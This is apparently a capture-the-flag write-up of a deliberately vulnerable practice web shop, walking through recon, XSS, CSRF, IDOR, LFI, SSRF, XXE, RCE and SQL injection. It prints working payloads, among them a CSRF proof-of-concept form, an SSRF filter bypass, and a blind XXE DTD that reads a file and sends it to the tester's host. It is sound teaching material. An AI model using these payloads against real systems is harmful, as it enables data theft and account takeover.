![image](/assets/Nahamstore/Logo.png)

# Room Info
In this room you will learn the basics of bug bounty hunting and web application hacking.

## Recon

### Nmap

```
Host is up (0.40s latency).
Not shown: 97 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    nginx 1.14.0 (Ubuntu)
8000/tcp open  http    nginx 1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Directory Fuzzing
```
 ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-directories-lowercase.txt   -u http://nahamstore.thm/FUZZ                        

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://nahamstore.thm/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-directories-lowercase.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

css                     [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 285ms]
register                [Status: 200, Size: 3138, Words: 904, Lines: 60, Duration: 344ms]
logout                  [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 366ms]
js                      [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 282ms]
search                  [Status: 200, Size: 3351, Words: 776, Lines: 72, Duration: 293ms]
login                   [Status: 200, Size: 3099, Words: 847, Lines: 61, Duration: 306ms]
uploads                 [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 297ms]
staff                   [Status: 200, Size: 2287, Words: 751, Lines: 51, Duration: 313ms]
basket                  [Status: 200, Size: 2465, Words: 647, Lines: 54, Duration: 313ms]
                        [Status: 200, Size: 4254, Words: 985, Lines: 83, Duration: 306ms]
returns                 [Status: 200, Size: 3628, Words: 1055, Lines: 75, Duration: 294ms]

```

### SubdomainEnum

First, I used some passive techniques for subdomain discovery and found the following subdomains:


```
marketing.nahamstore.com
stock.nahamstore.com
www.nahamstore.com
nahamstore.com
nahamstore-2020.nahamstore.com
shop.nahamstore.com       
```

Then, I used ffuf for subdomain and virtual host fuzzing but couldn't find anything new.


After solving the room's RCE section, I accessed the content of the `/etc/hosts` file, which contained virtual hosts and internal APIs.

```
127.0.0.1       localhost
::1     localhost ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
172.17.0.4      2431fe29a4b0
127.0.0.1       nahamstore.thm
127.0.0.1       www.nahamstore.thm
172.17.0.1      stock.nahamstore.thm
172.17.0.1      marketing.nahamstore.thm
172.17.0.1      shop.nahamstore.thm
172.17.0.1      nahamstore-2020.nahamstore.thm
172.17.0.1      nahamstore-2020-dev.nahamstore.thm
10.131.104.72   internal-api.nahamstore.thm
```

Using this information, I updated my own `/etc/hosts` file with the new virtual host and tried fuzzing the endpoints of `http://nahamstore-2020-dev.nahamstore.thm/` with ffuf. This process revealed the `api/customers/` endpoint.

![](/assets/Nahamstore/ffuf.png)

Browsing the endpoint, I saw the message `["customer_id is required"]`. I used `customer_id` as a parameter with the value of 1 and retrieved customer information. However, for the answer, we needed information about customer ID 2.

![](/assets/Nahamstore/recon.png)


## XSS 

**Question :Enter an URL ( including parameters ) of an endpoint that is vulnerable to XSS**

I used arjun for parameter discovery on the `marketing.nahamstore.thm` vhost and found the `error` parameter, which contains a simple XSS vulnerability.

![](/assets/Nahamstore/arjun-1.png)

![](/assets/Nahamstore/xss_1.png)


**Question : What HTTP header can be used to create a Stored XXS**

After completing the payment process and intercepting the request, changing the `User-Agent` header value with a simple XSS payload will result in a stored XSS.


![](/assets/Nahamstore/xss_2.png)

![](/assets/Nahamstore/xss_uer.png)
**Question : What HTML tag needs to be escaped on the product page to get the XSS to work?**


The product page at `http://nahamstore.thm/ `contains two GET parameters: `id` and `name`, `name` parameter was vulnerable to XSS. Escaping the title tag will lead to XSS.

![](/assets/Nahamstore/xss_3.png)

**Question : What JavaScript variable needs to be escaped to get the XSS to work?**

The `http://nahamstore.thm/` website's search functionality uses the `q` GET parameter for input data, which is assigned to the JavaScript `search` variable. Escaping this variable will result in XSS.

Vulnerable code.

![](/assets/Nahamstore/xss_vuln_code.png)

![](/assets/Nahamstore/xss_4.png)

**Question : What hidden parameter can be found on the shop home page that introduces an XSS vulnerability.**

Ans : **q**

**Question : What HTML tag needs to be escaped on the returns page to get the XSS to work?**

The `textarea` tag on the returns page should be escaped to prevent XSS.

![](/assets/Nahamstore/xss_5.png)


**Question : What is the value of the H1 tag of the page that uses the requested URL to create an XSS**

A path-based XSS vulnerability exists. Adding a non-existent directory name reflects on the page, and using an XSS payload will lead to XSS. Since the page doesn't exist, the title will display a "Page not found" error,And this is the answer of the question.

![](/assets/Nahamstore/xss_6.png)
![](/assets/Nahamstore/xss_6_.png)


**Question : What other hidden parameter can be found on the shop which can introduce an XSS vulnerability**

The discount POST parameter can be used in a GET request, reflecting its value in the discount field.

![](/assets/Nahamstore/xss_7ss.png)

Escaping the value attribute and introducing a new attribute  will result in XSS.

![](/assets/Nahamstore/xss_7.png)

## Open Redirect

**Question : Open Redirect One**


Using arjun for parameter discovery, I discovered a new parameter `r` which was vulnerable to open redirect.
![](/assets/Nahamstore/opredirect_1.png)

The URL `http://nahamstore.thm/?r=http://google.com` will redirect the user to Google.

**Question : Open Redirect Two**

On the `addressbook` page, there was a parameter `redirect_url` that redirected the user to the basket page after adding an address and clicking "Add Address." This parameter was vulnerable to open redirect.

![](/assets/Nahamstore/idor_2.png)

When a user clicks the "Add Address" button, they will be redirected to `googl.com`.

## CSRF
**Question : What URL has no CSRF protection**

On this endpoint of the website `http://nahamstore.thm/account/settings`, there were three functionalities. After testing each of them, the password functionality `http://nahamstore.thm/account/settings/password` appeared vulnerable to CSRF attacks because there was no CSRF token in place or any type of unpredictable parameter. The other two requirements for a CSRF attack, cookie-based session handling, and a relevant action, were also satisfied.
![](/assets/Nahamstore/csrf_pass.png)

**CSRF POC**

```html
<html>
	<body>
		<form method="POST" action="https://nahamstore.thm/account/settings/password">
			<input type="hidden" name="change_password" value="password"/>
			<input type="submit" value="Submit">
		</form>
	</body>
<html>
```
**Question : What field can be removed to defeat the CSRF protection**

On the email change functionality, there was an unpredictable `csrf_protect` parameter that should be removed to defeat the CSRF protection.


![](/assets/Nahamstore/csrf_email.png)

**Question : What simple encoding is used to try and CSRF protect a form**

On the disable account functionality, there was a `csrf_disable_protect` parameter that contained a value with base64 encoding to protect against CSRF attacks.

![](/assets/Nahamstore/csrf_disbale.png)

## IDOR


**Question : First Line of Address**

On the endpoint `http://nahamstore.thm/basket`, a user can add their shipping address, which is linked to an `address_id` parameter. By simply changing this `address_id` parameter value to **3**, it's possible to view the first line of another user's address.

![](/assets/Nahamstore/idor_3.png)
![](/assets/Nahamstore/idor_pco.png)

**Question : Order ID 3 date and time**

On the endpoint `http://nahamstore.thm/account/orders/X,` a user can view their order details and generate a PDF. By modifying the `id` post parameter to an order ID that doesn't belong to the user, an error message reveals a new parameter, `user_id`.
.
![](/assets/Nahamstore/idor_last_one.png)
![](/assets/Nahamstore/idor_last.png)

By setting the `user_id` to `3` and the `id` parameter to `3`, it's possible to view the date and time of Order ID 3.Also, URL-encode the `&` symbol only before the `user_id` parameter, otherwise it will not work.
![](/assets/Nahamstore/iddor_pic_last.png)
![](/assets/Nahamstore/idor_last_s.png)



## Local File Inclusion

The website loads images using this URL: `http://nahamstore.thm/product/picture/?file=c10fc8ea58cb0caef1edbc0949337ff1.jpg`.

I tried simple LFI payloads but couldn't get any results. I then fuzzed the "file" parameter with the `LFI-Jhaddix.txt` wordlist and found an working LFI Payload.
![](/assets/Nahamstore/lfi.png)
I was then able to retrieve the flag.
![](/assets/Nahamstore/lfi_poc.png)


## SSRF

On the Product page, there is a stock check feature. After clicking the stock check button and intercepting the request, a `server` parameter was revealed. This parameter contains the website responsible for handling the stock check request

![](/assets/Nahamstore/ssrf_1.png)

Initial attempts to exploit the `server` parameter with a controlled website were unsuccessful, resulting in an error message.

![](/assets/Nahamstore/ssrf_2.png)

To bypass  blacklisting, a PortSwigger wordlist was utilized. The following payload proved effective: `stock.nahamstore.thm&@10.6.53.24:8000#.`

![](/assets/Nahamstore/ssrf.png)


Further testing involved attempting to access internal resources and fuzzing internal ports, but no additional vulnerabilities were identified. However, after solving the RCE  challenge and accessing the `/etc/hosts` file, an internal API `(internal-api.nahamstore.thm)` was discovered. By targeting this internal API, the flag was successfully retrieved.

![](/assets/Nahamstore/ssrf_4.png)


## XXE

**Question : XXE Flag**

During the recon phase, I discovered an HTTP vhost: `http://stock.nahamstore.thm/`.
Initial exploration was unrevealing, and a directory fuzzing attempt yielded no significant results. I then turned to parameter discovery using the tool arjun. This led to the identification of a hidden parameter, `xml`.

```bash
 arjun -u http://stock.nahamstore.thm/ 
    _
   /_| _ '
  (  |/ /(//) v2.2.7
      _/      

[*] Scanning 0/1: http://stock.nahamstore.thm/
[*] Probing the target for stability
[*] Analysing HTTP response for anomalies
[+] Extracted 7 parameters from response for testing
[*] Logicforcing the URL endpoint
[✓] parameter detected: xml, based on: body length
[+] Parameters found: xml 
```
When utilizing this xml parameter, the server unexpectedly returned an XML response instead of the usual JSON format. This deviation prompted me to investigate potential XXE vulnerabilities.Using this parameter i sent  post  request with  some xml data which  gave me following response.

![](/assets/Nahamstore/xxe_burp.png)

As the error states that `Unknown Endpoint or Method Requested` . Seeing this i added product id **1** before the `xml` parameter and got following response.

![](/assets/Nahamstore/xxe_burp_2.png)

Seeing this i thought that their may be `X-Token`  is some sort of http header but that  was not the case,after that i added  `x-tokoen` tag in my xml data with internel entity and it's value return  in response.Indicating XXE Vuln.

![](/assets/Nahamstore/xxe_burp_3.png)

After that i used externel entity to retrive the flag.

![](/assets/Nahamstore/xxe_burp_4.png)

**Question : Blind XXE Flag**

From the `FUFF` i discoverd this endpoit `http://nahamstore.thm/staff` While browsing the staff page , it was discovered that it allows uploading `.xlsx `files. Although intended for staff members, the functionality might be publicly accessible, allowing any user to upload these files. Since `.xlsx` files are essentially ZIP archives containing XML data, testing for XXE vulnerabilities becomes a valuable approach.

![](/assets/Nahamstore/xxe_2.png)


A sample `.xlsx`file was downloaded.

The file was unzipped using the command:

```
unzip sample-xlsx-files-sample3.xlsx -d extractet                                                                                            
Archive:  sample-xlsx-files-sample3.xlsx
  inflating: extractet/[Content_Types].xml  
  inflating: extractet/_rels/.rels   
  inflating: extractet/xl/_rels/workbook.xml.rels  
  inflating: extractet/xl/workbook.xml  
  inflating: extractet/xl/styles.xml  
  inflating: extractet/xl/worksheets/_rels/sheet2.xml.rels  
  inflating: extractet/xl/worksheets/sheet2.xml  
  inflating: extractet/xl/theme/theme1.xml  
  inflating: extractet/xl/worksheets/sheet1.xml  
  inflating: extractet/xl/sharedStrings.xml  
  inflating: extractet/docProps/app.xml  
  inflating: extractet/xl/calcChain.xml  
  inflating: extractet/xl/printerSettings/printerSettings1.bin  
  inflating: extractet/docProps/core.xml  
```

The content of `extracted/xl/workbook.xml` was modified with the following payload:

```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM
"http://10.6.53.24:8000/mal.dtd"> %xxe;]>
<workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships">
```
The modified files were compressed back into a new archive:

```
zip -r ../../new3.xlsx *
```

A web server was set up to serve the `mal.dtd` file containing the following content:

```xml
<!ENTITY % file SYSTEM "file:///flag.txt">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'http://10.6.53.24:8000/%file;'>">
%eval;
%error;
```
But flag's file content might be breaking the xml structure or it's mandatory in chellange to use php base64 filter, so i use php filters to base64 encode the flag's file content.

Updated dtd file's content.

```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/flag.txt">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'http://10.6.53.24:8000/%file;'>">
%eval;
%error;
```
Now seting up server again and uploading the file gave me flag.

![](/assets/Nahamstore/xxe.png)
                
## RCE

**Question : First RCE flag**


From an nmap scan, browsing the discovered **8000** port gives me an empty page. After that, I tried fuzzing the directory of the website and found the **http://nahamstore.thm:8000/admin/login** login page. After that, I entered **admin:admin** credentials, and that was a valid set of credentials. After entering the credentials, I was redirected to the admin endpoint where I could change the source code of the campaign. I tried executing commands with PHP payloads, and it worked. I retrieved the flag.

![](/assets/Nahamstore/rce_1.png)

![](/assets/Nahamstore/rce_1_2.png)

**Question : Second RCE flag**

As we already have this endpoint `http://nahamstore.thm/account/orders/4`, which is used to show order details and can be used to generate a PDF. The PDF generation endpoint was vulnerable to RCE when I entered a Bash command in backticks, it got executed and retrieved the flag.

![](/assets/Nahamstore/hhpp.png)
![](/assets/Nahamstore/http.png)
## SQL Injection

**Question : Flag 1**

On this endpoint of the web app `http://nahamstore.thm/product?id=1`, I simply entered a single quote after the ID's value and it gave me the following error, indicating an SQL injection vulnerability:

```sql
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' LIMIT 1' at line 1
```
Then I used SQLmap to exploit it.

![](/assets/Nahamstore/sqli_1.png)

**Question : Flag 2**

There is a post parameter `order_number` at this endpoint `http://nahamstore.thm/returns` which was vulnerable to blind base SQL injection. I found this vulnerable parameter using Burp Suite. After I copied the whole request from Burp, I used SQLMap on that request to retrieve the flag.

![](/assets/Nahamstore/burpsuite.png)

![](/assets/Nahamstore/sqli_new.png)









